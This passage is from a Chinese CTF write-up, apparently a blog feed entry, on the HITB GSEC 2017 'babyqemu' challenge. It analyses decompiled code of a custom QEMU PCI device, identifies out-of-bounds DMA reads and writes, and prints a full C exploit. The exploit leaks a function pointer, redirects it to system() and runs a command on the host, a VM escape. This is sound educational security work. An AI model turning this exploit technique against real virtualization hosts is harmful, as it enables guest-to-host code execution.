val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">0x90</span> )  <span class="comment">// 设置dma.cnt</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x98</span> &amp;&amp; val &amp; <span class="number">1</span> &amp;&amp; !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )  <span class="comment">// 设置dma.cmd</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, v7 / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x84</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x88</span> &amp;&amp; !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )  <span class="comment">// 设置dma.dst</span></span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( val &amp; <span class="number">0x80</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; !(opaque-&gt;status &amp; <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>addr==0x80 &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 设置dma.src</p></li><li><p><code>addr==0x84 &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 设置dma.src高地址处的4byte。</p><p>（指向无定义空间，从上面dms_state的定义可以看出，其中的成员8字节对齐</p></li><li><p><code>addr==0x88 &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 设置dma.dst</p></li><li><p><code>addr==0x8c &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 同上</p></li><li><p><code>addr==0x90 &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 设置dma.cnt</p></li><li><p><code>addr==0x98 &amp;&amp; dma.cmd&amp;1==0</code> —–&gt; 设置dma.cmd，最低位需为1。同时<code>timer_mod</code>启动定时器，会触发<code>hitb_dma_timer</code></p></li></ol><p><code>hitb_dma_timer</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *addr; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *data; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( cmd &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd &amp; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      idx = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( cmd &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        data = &amp;opaque-&gt;dma_buf[idx];</span><br><span class="line">        opaque-&gt;enc(data, opaque-&gt;dma.cnt);</span><br><span class="line">        addr = (<span class="keyword">uint8_t</span> *)data;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        addr = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[idx];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, addr, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 这里的反编译很崎岖，但是看反汇编还是可以看出来和读的操作是一致的</span></span><br><span class="line">      <span class="comment">// 即：addr-0x40000作为idx，索引dma_buf</span></span><br><span class="line">      v6 = &amp;opaque[<span class="number">0xFFFFFFDB</span>LL].dma_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst + <span class="number">0x510</span>];  </span><br><span class="line">      LODWORD(addr) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">0xBB8</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, (<span class="keyword">uint8_t</span> *)v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;dma.cmd &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        addr = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">uint8_t</span> *, <span class="keyword">dma_addr_t</span>))opaque-&gt;enc)(v6, addr, v5);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;  <span class="comment">// 把最低bit清掉了。又可以再次写入了</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)addr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmd的bit含义</p><ol><li>bit1 —–&gt; 是否为合规cmd（推测</li><li>bit2 —–&gt; dma.dst向dma.src拷贝，还是相反方向</li><li>bit3 —–&gt; 是否使用enc函数加密</li></ol><p><code>cpu_physical_memory_rw</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// qemu-5.1.0/exec.c</span></span><br><span class="line"><span class="function">MemTxResult <span class="title">address_space_rw</span><span class="params">(AddressSpace *as, hwaddr addr, MemTxAttrs attrs,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">void</span> *buf, hwaddr len, <span class="keyword">bool</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_write) &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">void</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">                            hwaddr len, <span class="keyword">bool</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    address_space_rw(&amp;address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                     buf, len, is_write);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>is_write==1</code>: 从buf读取len，写入物理地址addr。</p><p><code>is_write==0</code>: 从物理地址addr读取，写入buf。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在DMA的read和write中存在越界。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>从<code>HitbState</code>可以看出，成员<code>dma_buf</code>后方紧跟<code>enc</code>函数指针。</p><p>读取<code>enc</code>的函数地址，通过偏移得到<code>system@plt.got</code>的地址，写入到<code>enc</code>。</p><p>写入<code>cat flag</code>字符串，使<code>enc</code>以这个字符串来调用。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/qemu_pwn/HITB_GSEC_2017_babyqemu/exp.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMA_BASE 0x40000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *iomem;</span><br><span class="line"><span class="keyword">uint8_t</span> *dmabuf;</span><br><span class="line"><span class="keyword">uint64_t</span> dmabuf_phys_addr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">virt2phys</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> virt = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line">    assert((virt&amp;<span class="number">0xfff</span>) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> offset = virt &gt;&gt; (PAGE_SHIFT<span class="number">-3</span>);</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> phys;</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;phys, <span class="number">8</span>) != <span class="number">8</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(phys &amp; (<span class="number">1U</span>LL &lt;&lt; <span class="number">63</span>));</span><br><span class="line"></span><br><span class="line">    phys = (phys &amp; ((<span class="number">1U</span>LL &lt;&lt; <span class="number">54</span>) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    <span class="keyword">return</span> phys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">iowrite</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span> *)(iomem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">ioread</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span> *)(iomem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_setsrc</span><span class="params">(<span class="keyword">uint32_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    iowrite(<span class="number">0x80</span>, src);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_setdst</span><span class="params">(<span class="keyword">uint32_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    iowrite(<span class="number">0x88</span>, dst);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_setcnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    iowrite(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_setcmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    iowrite(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_read</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_setsrc(addr);</span><br><span class="line">    dma_setdst(dmabuf_phys_addr);</span><br><span class="line">    dma_setcnt(len);</span><br><span class="line">    dma_setcmd(<span class="number">0x3</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(dmabuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_setsrc(dmabuf_phys_addr);</span><br><span class="line">    dma_setdst(addr);</span><br><span class="line">    dma_setcnt(len);</span><br><span class="line">    dma_setcmd(<span class="number">0x1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_enc_read</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_setsrc(addr);</span><br><span class="line">    dma_setdst(dmabuf_phys_addr);</span><br><span class="line">    dma_setcnt(len);</span><br><span class="line">    dma_setcmd(<span class="number">0x7</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR|O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    iomem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iomem == MAP_FAILED) &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iomem          @ %p\n&quot;</span>, iomem);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED) &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// lock part or all of the calling process&#x27;s virtual address space</span></span><br><span class="line">    <span class="comment">// into RAM, preventing that memory from being paged to the swap area.</span></span><br><span class="line">    mlock(dmabuf, <span class="number">0x1000</span>);</span><br><span class="line">    dmabuf_phys_addr = virt2phys(dmabuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dmabuff        @ %p\n&quot;</span>, dmabuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dmabuff(phys)  @ %p\n&quot;</span>, (<span class="keyword">void</span> *)dmabuf_phys_addr);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak hitb_enc address</span></span><br><span class="line">    dma_read(DMA_BASE+<span class="number">0x1000</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> hitb_enc = *((<span class="keyword">uint64_t</span> *)dmabuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate the system plt.got address</span></span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base      = hitb_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_pltgot = elf_base + <span class="number">0x1FDB18</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system@plt.got @ 0x%lx\n&quot;</span>, system_pltgot);</span><br><span class="line"></span><br><span class="line">    dma_write(DMA_BASE+<span class="number">0x1000</span>, &amp;system_pltgot, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">char</span> *payload = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">    dma_write(DMA_BASE+<span class="number">0x100</span>, payload, <span class="built_in">strlen</span>(payload));</span><br><span class="line"></span><br><span class="line">    dma_enc_read(DMA_BASE+<span class="number">0x100</span>, <span class="number">0x4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://kitctf.de/writeups/hitb2017/babyqemu">HITB GSEC 2017: babyqemu</a></li><li>[Sakura_University/外卡赛/HITB GSEC 2017 at master · tina2114/Sakura_University ](<a href="https://github.com/tina2114/Sakura_University/tree/master/%E5%A4%96%E5%8D%A1%E8%B5%9B/HITB">https://github.com/tina2114/Sakura_University/tree/master/外卡赛/HITB</a> GSEC 2017) zhz师傅tql</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目下载地址：&lt;a href=&quot;https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz&quot;&gt;babyqemu.tar.gz&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;&lt;code&gt;tar xvzf babyqemu.tar.gz&lt;/code&gt;解压看到启动脚本&lt;code&gt;launch.sh&lt;/code&gt;&lt;/p&gt;
